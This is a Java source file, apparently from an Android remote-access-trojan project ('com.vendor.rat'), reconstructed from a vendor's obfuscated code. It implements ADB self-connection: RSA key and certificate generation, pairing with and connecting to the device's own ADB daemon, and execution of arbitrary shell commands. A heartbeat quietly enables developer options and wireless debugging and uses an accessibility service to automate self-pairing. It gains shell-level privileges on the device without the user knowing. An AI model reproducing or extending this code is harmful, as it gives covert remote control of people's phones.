package com.vendor.rat.adb;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.vendor.rat.control.entity.ADBConfig;
import com.vendor.rat.utils.SecureSettingsWriter;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;

import com.vendor.rat.auto.engine.adb.WirelessPairEngine;
import com.vendor.rat.service.MyAccessibilityService;

import io.github.muntashirakon.adb.AbsAdbConnectionManager;
import io.github.muntashirakon.adb.AdbStream;

/**
 * ADB Connection Manager - core self-connection component.
 * Extends libadb-android AbsAdbConnectionManager.
 *
 * Vendor: h/e.java (extends b1/b.java = AbsAdbConnectionManager)
 *
 * Manages:
 * - RSA 2048 keypair + self-signed X509 certificate for TLS auth with adbd
 * - SPAKE2 pairing via pair()
 * - Connection via connect()
 * - mDNS auto-discovery via autoConnect()
 * - Shell command execution via AdbStream
 * - Heartbeat / auto-reconnect
 */
public final class AdbConnectionManager extends AbsAdbConnectionManager {

    private static final String TAG = "AdbConnectionManager";

    /** Default ADB wireless debugging port */
    private static final int DEFAULT_PORT = 5555;

    /** Connection timeout in milliseconds */
    private static final long CONNECT_TIMEOUT_MS = 10_000L;

    /** Pairing timeout in seconds */
    private static final long PAIR_TIMEOUT_SEC = 15L;

    /** Shell read timeout in milliseconds */
    private static final long SHELL_READ_TIMEOUT_MS = 5_000L;

    // Singleton
    private static volatile AdbConnectionManager sInstance;

    // Context
    private final Context mContext;

    // RSA keypair fields
    private PrivateKey mPrivateKey;
    private Certificate mCertificate;

    // State flags
    private final AtomicBoolean mPaired = new AtomicBoolean(false);
    private final AtomicBoolean mConnected = new AtomicBoolean(false);

    // Locks
    private final ReentrantLock mConnectLock = new ReentrantLock();
    private final ReentrantLock mPairLock = new ReentrantLock();
    private final ReentrantLock mHeartbeatLock = new ReentrantLock();

    // Async executor
    private final ExecutorService mAsyncExecutor = Executors.newFixedThreadPool(1);

    /** Cooldown timestamp for wireless pairing trigger (5 minutes between attempts) */
    private final AtomicLong mLastPairAttempt = new AtomicLong(0);

    /** Cooldown duration between pairing attempts: 1 minute (short for rapid iteration) */
    private static final long PAIR_COOLDOWN_MS = 60 * 1000L;

    // ========== Construction / Singleton ==========

    private AdbConnectionManager(Context context) {
        this.mContext = context.getApplicationContext();
        setApi(Build.VERSION.SDK_INT);
        setTimeout(CONNECT_TIMEOUT_MS, TimeUnit.MILLISECONDS);

        // Load pairing state from persistence
        mPaired.set(AdbPersistence.isPaired());

        // Load or generate RSA keypair
        loadOrGenerateKeys();
    }

    /** Initialize singleton. Must be called from Application.onCreate(). */
    public static void init(Context context) {
        if (sInstance != null || context == null) return;
        synchronized (AdbConnectionManager.class) {
            if (sInstance == null) {
                sInstance = new AdbConnectionManager(context);
            }
        }
    }

    /** Get singleton instance. init() must have been called first. */
    public static AdbConnectionManager getInstance() {
        return sInstance;
    }

    // ========== Abstract method implementations ==========

    @Override
    protected PrivateKey getPrivateKey() {
        return mPrivateKey;
    }

    @Override
    protected Certificate getCertificate() {
        return mCertificate;
    }

    @Override
    protected String getDeviceName() {
        return "com.vendor.rat";
    }

    // ========== Connection state ==========

    /** Check if ADB connection is active */
    public boolean isAdbConnected() {
        try {
            boolean parentConnected = isConnected();
            mConnected.set(parentConnected);
            return parentConnected;
        } catch (Exception e) {
            Log.e(TAG, "isAdbConnected check failed", e);
            mConnected.set(false);
            return false;
        }
    }

    /** Check if this device has been paired */
    public boolean isPaired() {
        return mPaired.get();
    }

    /** Get current ADB configuration snapshot */
    public ADBConfig getAdbConfig() {
        ADBConfig config = AdbPersistence.loadConfig();
        config.setConnected(isAdbConnected());
        config.setPaired(mPaired.get());
        config.setEnableWifiDebug(
            SecureSettingsWriter.isWifiDebugEnabled(mContext) ? 1 : 0);
        config.setEnableDebug(
            SecureSettingsWriter.isUsbDebugEnabled(mContext) ? 1 : 0);
        config.setEnableDevelopment(
            SecureSettingsWriter.isDeveloperOptionsEnabled(mContext) ? 1 : 0);
        return config;
    }

    // ========== Pairing ==========

    /**
     * SPAKE2 pair with ADB daemon.
     * Vendor: h/e.java K() -> calls parent F() (pair)
     *
     * @param host     ADB daemon host (usually 127.0.0.1 or device IP)
     * @param port     Pairing port (from mDNS discovery)
     * @param pairCode 6-digit pairing code from developer settings
     * @return true if pairing succeeded
     */
    public boolean doPair(String host, int port, String pairCode) {
        if (host == null || pairCode == null || port <= 0) return false;
        if (!mPairLock.tryLock()) return false;
        try {
            Log.d(TAG, "doPair: host=" + host + " port=" + port);
            boolean result = pair(host, port, pairCode);
            if (result) {
                mPaired.set(true);
                ADBConfig config = AdbPersistence.loadConfig();
                config.setPaired(true);
                AdbPersistence.saveConfig(config);
                Log.d(TAG, "Pairing succeeded");
            } else {
                Log.w(TAG, "Pairing failed");
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "doPair exception", e);
            return false;
        } finally {
            mPairLock.unlock();
        }
    }

    // ========== Connection ==========

    /**
     * Connect to ADB daemon on given port.
     * Vendor: h/e.java J() -> calls parent y() / z() (connect)
     *
     * @param port ADB debugging port (from mDNS or known port)
     * @return true if connection succeeded
     */
    public boolean doConnect(int port) {
        if (port <= 0) return false;
        if (!mConnectLock.tryLock()) return false;
        try {
            if (isAdbConnected()) {
                Log.d(TAG, "Already connected");
                return true;
            }
            Log.d(TAG, "doConnect: port=" + port);
            boolean result = connect(port);
            mConnected.set(result);
            if (result) {
                ADBConfig config = AdbPersistence.loadConfig();
                config.setConnected(true);
                config.setDebugPort(port);
                config.setConnectedDevice(getDeviceName());
                AdbPersistence.saveConfig(config);
                Log.d(TAG, "Connection succeeded on port " + port);
            } else {
                Log.w(TAG, "Connection failed on port " + port);
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "doConnect exception", e);
            mConnected.set(false);
            return false;
        } finally {
            mConnectLock.unlock();
        }
    }

    /**
     * Connect to ADB daemon with host + port.
     *
     * @param host ADB daemon host
     * @param port ADB debugging port
     * @return true if connection succeeded
     */
    public boolean doConnect(String host, int port) {
        if (host == null || port <= 0) return false;
        if (!mConnectLock.tryLock()) return false;
        try {
            if (isAdbConnected()) return true;
            Log.d(TAG, "doConnect: host=" + host + " port=" + port);
            boolean result = connect(host, port);
            mConnected.set(result);
            if (result) {
                ADBConfig config = AdbPersistence.loadConfig();
                config.setConnected(true);
                config.setDebugPort(port);
                config.setConnectedDevice(getDeviceName());
                AdbPersistence.saveConfig(config);
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "doConnect(host,port) exception", e);
            mConnected.set(false);
            return false;
        } finally {
            mConnectLock.unlock();
        }
    }

    /**
     * mDNS discover + auto-connect.
     * Vendor: h/e.java uses c1.d (AdbMdns) for discovery, then connect.
     *
     * @return true if auto-connect succeeded
     */
    public boolean doAutoConnect() {
        if (!mConnectLock.tryLock()) return false;
        try {
            if (isAdbConnected()) return true;
            Log.d(TAG, "doAutoConnect: starting mDNS discovery...");
            boolean result = autoConnect(mContext, CONNECT_TIMEOUT_MS);
            mConnected.set(result);
            if (result) {
                ADBConfig config = AdbPersistence.loadConfig();
                config.setConnected(true);
                config.setConnectedDevice(getDeviceName());
                AdbPersistence.saveConfig(config);
                Log.d(TAG, "Auto-connect succeeded");
            } else {
                Log.w(TAG, "Auto-connect failed");
            }
            return result;
        } catch (Exception e) {
            Log.e(TAG, "doAutoConnect exception", e);
            mConnected.set(false);
            return false;
        } finally {
            mConnectLock.unlock();
        }
    }

    // ========== Shell execution ==========

    /**
     * Execute a shell command and return the result.
     * Vendor: h/e.java Q() / N() / P() pattern:
     *   openStream("shell:") -> write command -> read output -> close
     *
     * @param command Shell command to execute
     * @return AdbShellResult with exit status and output, or null on failure
     */
    public AdbShellResult executeShell(String command) {
        if (command == null || command.isEmpty()) {
            return new AdbShellResult(false, "Empty command");
        }
        if (!isAdbConnected()) {
            return new AdbShellResult(false, "Not connected to ADB");
        }
        AdbStream stream = null;
        try {
            // Open shell stream with the command directly
            stream = openStream("shell:" + command);

            // Read output
            StringBuilder output = new StringBuilder();
            InputStream is = stream.openInputStream();
            byte[] buffer = new byte[4096];
            long startTime = System.currentTimeMillis();
            while (!stream.isClosed()) {
                int available = is.available();
                if (available > 0) {
                    int read = is.read(buffer, 0, Math.min(available, buffer.length));
                    if (read > 0) {
                        output.append(new String(buffer, 0, read, StandardCharsets.UTF_8));
                    }
                    startTime = System.currentTimeMillis(); // reset timeout on data
                } else {
                    if (System.currentTimeMillis() - startTime > SHELL_READ_TIMEOUT_MS) {
                        break; // timeout
                    }
                    Thread.sleep(50);
                }
            }
            // Read any remaining data
            while (is.available() > 0) {
                int read = is.read(buffer);
                if (read > 0) {
                    output.append(new String(buffer, 0, read, StandardCharsets.UTF_8));
                }
            }

            return new AdbShellResult(true, output.toString().trim());
        } catch (Exception e) {
            Log.e(TAG, "executeShell failed: " + command, e);
            return new AdbShellResult(false, e.getMessage());
        } finally {
            if (stream != null) {
                try { stream.close(); } catch (IOException ignored) {}
            }
        }
    }

    /**
     * Execute a shell command asynchronously (fire and forget).
     * Vendor: h/e.java O() pattern.
     *
     * @param command Shell command to execute
     */
    public void executeShellAsync(String command) {
        if (command == null || command.isEmpty()) return;
        mAsyncExecutor.submit(() -> {
            AdbStream stream = null;
            try {
                stream = openStream("shell:");
                OutputStream os = stream.openOutputStream();
                os.write(String.format("%s\n", command).getBytes(StandardCharsets.UTF_8));
                os.flush();
            } catch (Exception e) {
                Log.e(TAG, "executeShellAsync failed: " + command, e);
            } finally {
                if (stream != null) {
                    try { stream.close(); } catch (IOException ignored) {}
                }
            }
        });
    }

    /**
     * Execute shell command and check if output contains expected string.
     * Vendor: h/e.java N() pattern.
     *
     * @param command        Shell command
     * @param expectedOutput Expected substring in output
     * @return true if output contains expected string
     */
    public boolean executeShellExpect(String command, String expectedOutput) {
        AdbShellResult result = executeShell(command);
        if (result == null || !result.isSuccess()) return false;
        return result.getOutput() != null && result.getOutput().contains(expectedOutput);
    }

    // ========== Wireless debugging ==========

    /**
     * Enable wireless debugging via SecureSettingsWriter.
     * Vendor: h/e.java a0().
     *
     * @return true if wireless debugging was enabled
     */
    public boolean enableWirelessDebugging() {
        Log.d(TAG, "enableWirelessDebugging");

        // Try via SecureSettingsWriter first (requires WRITE_SECURE_SETTINGS)
        if (SecureSettingsWriter.hasPermission(mContext)) {
            // Enable developer options first
            if (!SecureSettingsWriter.isDeveloperOptionsEnabled(mContext)) {
                SecureSettingsWriter.enableDeveloperOptions(mContext);
            }
            return SecureSettingsWriter.enableWifiDebug(mContext);
        }

        Log.w(TAG, "No WRITE_SECURE_SETTINGS permission, cannot enable wireless debugging");
        return false;
    }

    // ========== Heartbeat ==========

    /**
     * Periodic heartbeat check + auto-reconnect.
     * Vendor: h/e.java H().
     * Called from KeepHeartThread periodically.
     */
    public void heartbeat() {
        if (!mHeartbeatLock.tryLock()) return;
        try {
            // Trigger wireless self-pairing FIRST — before keys check
            // (pairing itself will generate keys if needed)
            triggerPairingIfNeeded();

            if (mPrivateKey == null || mCertificate == null) {
                Log.d(TAG, "heartbeat: no keys available, skipping reconnect");
                return;
            }

            // If not connected and we have been paired, try to reconnect
            if (!isAdbConnected() && mPaired.get()) {
                if (!SecureSettingsWriter.isWifiDebugEnabled(mContext)) {
                    enableWirelessDebugging();
                }
                // Try auto-connect via mDNS
                if (mPrivateKey != null && mCertificate != null) {
                    mAsyncExecutor.submit(this::doAutoConnect);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "heartbeat exception", e);
        } finally {
            mHeartbeatLock.unlock();
        }
    }

    /**
     * Trigger WirelessPairEngine if all conditions are met:
     * 1. Not yet paired
     * 2. WiFi is connected (wireless pairing requires WiFi)
     * 3. Accessibility service is running (engine needs it for UI automation)
     * 4. Pairing is not already in progress
     * 5. Cooldown of 5 minutes between attempts has elapsed
     */
    private void triggerPairingIfNeeded() {
        try {
            // Already paired — nothing to do
            if (mPaired.get()) return;

            // Already in progress
            if (WirelessPairEngine.isPairingInProgress()) return;

            // Accessibility service must be running
            if (MyAccessibilityService.getInstance() == null) return;

            // Check WiFi connectivity
            if (!isWifiConnected()) return;

            // Cooldown: only try once every 5 minutes
            long now = System.currentTimeMillis();
            long lastAttempt = mLastPairAttempt.get();
            if (lastAttempt > 0 && (now - lastAttempt) < PAIR_COOLDOWN_MS) return;

            // All conditions met — attempt pairing
            mLastPairAttempt.set(now);
            Log.i(TAG, "heartbeat: triggering wireless self-pairing");
            WirelessPairEngine.startPairing(mContext);
        } catch (Exception e) {
            Log.w(TAG, "triggerPairingIfNeeded failed", e);
        }
    }

    /**
     * Check if device is connected to WiFi.
     * Uses ConnectivityManager to verify TRANSPORT_WIFI is active.
     */
    private boolean isWifiConnected() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                    mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            android.net.Network network = cm.getActiveNetwork();
            if (network == null) return false;
            android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(network);
            return caps != null && caps.hasTransport(
                    android.net.NetworkCapabilities.TRANSPORT_WIFI);
        } catch (Exception e) {
            return false;
        }
    }

    // ========== Disconnect ==========

    /**
     * Disconnect from ADB daemon and update state.
     */
    public void doDisconnect() {
        try {
            disconnect();
            mConnected.set(false);
            ADBConfig config = AdbPersistence.loadConfig();
            config.setConnected(false);
            AdbPersistence.saveConfig(config);
            Log.d(TAG, "Disconnected");
        } catch (Exception e) {
            Log.e(TAG, "doDisconnect exception", e);
        }
    }

    @Override
    public void close() throws IOException {
        mAsyncExecutor.shutdownNow();
        mConnected.set(false);
        super.close();
    }

    // ========== RSA Key Management ==========

    /**
     * Load existing RSA keys from file, or generate new ones.
     * Vendor: h/e.java C() / B() delegates to g.H0() / g.I0().
     */
    private void loadOrGenerateKeys() {
        try {
            String privateKeyPath = AdbPersistence.getPrivateKeyPath();
            String certPath = AdbPersistence.getCertPath();

            // Try loading existing keys
            if (privateKeyPath != null && certPath != null) {
                File pkFile = new File(privateKeyPath);
                File certFile = new File(certPath);
                if (pkFile.exists() && certFile.exists()) {
                    mPrivateKey = loadPrivateKey(pkFile);
                    mCertificate = loadCertificate(certFile);
                    if (mPrivateKey != null && mCertificate != null) {
                        Log.d(TAG, "Loaded existing RSA keys");
                        return;
                    }
                }
            }

            // Generate new keypair
            generateAndSaveKeys();
        } catch (Exception e) {
            Log.e(TAG, "loadOrGenerateKeys failed", e);
        }
    }

    /**
     * Generate RSA 2048 keypair and self-signed X509 certificate.
     */
    private void generateAndSaveKeys() {
        try {
            // Generate RSA 2048 keypair
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
            kpg.initialize(2048);
            KeyPair keyPair = kpg.generateKeyPair();
            mPrivateKey = keyPair.getPrivate();

            // Create self-signed X509 certificate
            mCertificate = generateSelfSignedCertificate(keyPair);

            // Save to files
            File keyDir = getKeyDirectory();
            if (keyDir == null) return;

            File pkFile = new File(keyDir, "adb_private.key");
            File certFile = new File(keyDir, "adb_cert.pem");

            saveBytes(pkFile, mPrivateKey.getEncoded());
            saveBytes(certFile, mCertificate.getEncoded());

            AdbPersistence.saveKeyPaths(pkFile.getAbsolutePath(), certFile.getAbsolutePath());
            Log.d(TAG, "Generated and saved new RSA keypair");
        } catch (Exception e) {
            Log.e(TAG, "generateAndSaveKeys failed", e);
        }
    }

    /**
     * Generate a self-signed X509 certificate for ADB TLS authentication.
     * Uses a minimal DER-encoded approach compatible with Android's security API.
     */
    private Certificate generateSelfSignedCertificate(KeyPair keyPair) {
        try {
            // Build minimal self-signed X509 v1 certificate using DER encoding
            byte[] publicKeyEncoded = keyPair.getPublic().getEncoded();

            // Use Android Keystore-compatible approach:
            // Create a minimal X509 cert via certificate factory
            // by building the DER structure manually
            java.security.Signature sig = java.security.Signature.getInstance("SHA256withRSA");
            sig.initSign(keyPair.getPrivate());

            // TBS Certificate components
            byte[] serialNumber = asn1Integer(BigInteger.ONE);
            byte[] signatureAlgorithm = sha256WithRsaAlgorithmIdentifier();
            byte[] issuer = asn1DistinguishedName("CN=adb_self_signed");
            byte[] validity = asn1Validity();
            byte[] subject = issuer; // self-signed
            byte[] subjectPublicKeyInfo = publicKeyEncoded;

            // TBS Certificate sequence
            byte[] version = asn1Explicit(0, asn1Integer(BigInteger.valueOf(2))); // v3
            byte[] tbsCertificate = asn1Sequence(
                version, serialNumber, signatureAlgorithm,
                issuer, validity, subject, subjectPublicKeyInfo
            );

            // Sign TBS
            sig.update(tbsCertificate);
            byte[] signatureValue = sig.sign();

            // Wrap in BIT STRING
            byte[] signatureBitString = asn1BitString(signatureValue);

            // Full certificate: SEQUENCE { tbsCertificate, signatureAlgorithm, signatureValue }
            byte[] fullCert = asn1Sequence(tbsCertificate, signatureAlgorithm, signatureBitString);

            CertificateFactory cf = CertificateFactory.getInstance("X.509");
            return cf.generateCertificate(new ByteArrayInputStream(fullCert));
        } catch (Exception e) {
            Log.e(TAG, "generateSelfSignedCertificate failed", e);
            return null;
        }
    }

    // ========== ASN.1 DER encoding helpers ==========

    private static byte[] asn1Length(int length) {
        if (length < 128) {
            return new byte[]{(byte) length};
        } else if (length < 256) {
            return new byte[]{(byte) 0x81, (byte) length};
        } else if (length < 65536) {
            return new byte[]{(byte) 0x82, (byte) (length >> 8), (byte) length};
        } else {
            return new byte[]{(byte) 0x83, (byte) (length >> 16), (byte) (length >> 8), (byte) length};
        }
    }

    private static byte[] asn1Sequence(byte[]... components) {
        int totalLen = 0;
        for (byte[] c : components) totalLen += c.length;
        byte[] lenBytes = asn1Length(totalLen);
        byte[] result = new byte[1 + lenBytes.length + totalLen];
        result[0] = 0x30; // SEQUENCE tag
        System.arraycopy(lenBytes, 0, result, 1, lenBytes.length);
        int offset = 1 + lenBytes.length;
        for (byte[] c : components) {
            System.arraycopy(c, 0, result, offset, c.length);
            offset += c.length;
        }
        return result;
    }

    private static byte[] asn1Integer(BigInteger value) {
        byte[] encoded = value.toByteArray();
        byte[] lenBytes = asn1Length(encoded.length);
        byte[] result = new byte[1 + lenBytes.length + encoded.length];
        result[0] = 0x02; // INTEGER tag
        System.arraycopy(lenBytes, 0, result, 1, lenBytes.length);
        System.arraycopy(encoded, 0, result, 1 + lenBytes.length, encoded.length);
        return result;
    }

    private static byte[] asn1BitString(byte[] data) {
        int totalLen = 1 + data.length; // 1 byte for unused-bits count
        byte[] lenBytes = asn1Length(totalLen);
        byte[] result = new byte[1 + lenBytes.length + totalLen];
        result[0] = 0x03; // BIT STRING tag
        System.arraycopy(lenBytes, 0, result, 1, lenBytes.length);
        result[1 + lenBytes.length] = 0x00; // no unused bits
        System.arraycopy(data, 0, result, 2 + lenBytes.length, data.length);
        return result;
    }

    private static byte[] asn1Explicit(int tagNumber, byte[] content) {
        byte[] lenBytes = asn1Length(content.length);
        byte[] result = new byte[1 + lenBytes.length + content.length];
        result[0] = (byte) (0xA0 | tagNumber); // context-specific, constructed
        System.arraycopy(lenBytes, 0, result, 1, lenBytes.length);
        System.arraycopy(content, 0, result, 1 + lenBytes.length, content.length);
        return result;
    }

    private static byte[] sha256WithRsaAlgorithmIdentifier() {
        // OID 1.2.840.113549.1.1.11 (sha256WithRSAEncryption) + NULL parameters
        return new byte[]{
            0x30, 0x0D,
            0x06, 0x09, 0x2A, (byte) 0x86, 0x48, (byte) 0x86, (byte) 0xF7, 0x0D, 0x01, 0x01, 0x0B,
            0x05, 0x00
        };
    }

    private static byte[] asn1DistinguishedName(String cn) {
        // UTF8String for CN value
        byte[] cnBytes = cn.getBytes(StandardCharsets.UTF_8);
        // CN OID: 2.5.4.3
        byte[] cnOid = new byte[]{0x06, 0x03, 0x55, 0x04, 0x03};
        // UTF8String
        byte[] cnLenBytes = asn1Length(cnBytes.length);
        byte[] utf8String = new byte[1 + cnLenBytes.length + cnBytes.length];
        utf8String[0] = 0x0C; // UTF8String
        System.arraycopy(cnLenBytes, 0, utf8String, 1, cnLenBytes.length);
        System.arraycopy(cnBytes, 0, utf8String, 1 + cnLenBytes.length, cnBytes.length);

        byte[] attrTypeAndValue = asn1Sequence(cnOid, utf8String);
        // SET OF AttributeTypeAndValue
        byte[] setLen = asn1Length(attrTypeAndValue.length);
        byte[] rdnSet = new byte[1 + setLen.length + attrTypeAndValue.length];
        rdnSet[0] = 0x31; // SET tag
        System.arraycopy(setLen, 0, rdnSet, 1, setLen.length);
        System.arraycopy(attrTypeAndValue, 0, rdnSet, 1 + setLen.length, attrTypeAndValue.length);

        return asn1Sequence(rdnSet);
    }

    private static byte[] asn1Validity() {
        // NotBefore: 2024-01-01T00:00:00Z, NotAfter: 2034-01-01T00:00:00Z
        byte[] notBefore = asn1UtcTime("240101000000Z");
        byte[] notAfter = asn1UtcTime("340101000000Z");
        return asn1Sequence(notBefore, notAfter);
    }

    private static byte[] asn1UtcTime(String time) {
        byte[] timeBytes = time.getBytes(StandardCharsets.US_ASCII);
        byte[] lenBytes = asn1Length(timeBytes.length);
        byte[] result = new byte[1 + lenBytes.length + timeBytes.length];
        result[0] = 0x17; // UTCTime tag
        System.arraycopy(lenBytes, 0, result, 1, lenBytes.length);
        System.arraycopy(timeBytes, 0, result, 1 + lenBytes.length, timeBytes.length);
        return result;
    }

    // ========== File I/O helpers ==========

    private File getKeyDirectory() {
        File dir = new File(mContext.getFilesDir(), "adb_keys");
        if (!dir.exists() && !dir.mkdirs()) {
            Log.e(TAG, "Failed to create key directory: " + dir);
            return null;
        }
        return dir;
    }

    private static void saveBytes(File file, byte[] data) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
            fos.flush();
        }
    }

    private static PrivateKey loadPrivateKey(File file) {
        try {
            byte[] keyBytes = readAllBytes(file);
            PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(keyBytes);
            KeyFactory kf = KeyFactory.getInstance("RSA");
            return kf.generatePrivate(spec);
        } catch (Exception e) {
            Log.e(TAG, "loadPrivateKey failed", e);
            return null;
        }
    }

    private static Certificate loadCertificate(File file) {
        try {
            byte[] certBytes = readAllBytes(file);
            CertificateFactory cf = CertificateFactory.getInstance("X.509");
            return cf.generateCertificate(new ByteArrayInputStream(certBytes));
        } catch (Exception e) {
            Log.e(TAG, "loadCertificate failed", e);
            return null;
        }
    }

    private static byte[] readAllBytes(File file) throws IOException {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] data = new byte[(int) file.length()];
            int offset = 0;
            int read;
            while (offset < data.length && (read = fis.read(data, offset, data.length - offset)) > 0) {
                offset += read;
            }
            return data;
        }
    }

    /** Reset singleton (for testing and debug). */
    public static void resetForTesting() {
        sInstance = null;
    }

    // ========== Shell result ==========

    /**
     * Result of a shell command execution.
     */
    public static final class AdbShellResult {
        private final boolean success;
        private final String output;

        public AdbShellResult(boolean success, String output) {
            this.success = success;
            this.output = output;
        }

        public boolean isSuccess() {
            return success;
        }

        public String getOutput() {
            return output;
        }

        @Override
        public String toString() {
            return "AdbShellResult{success=" + success + ", output='" + output + "'}";
        }
    }
}
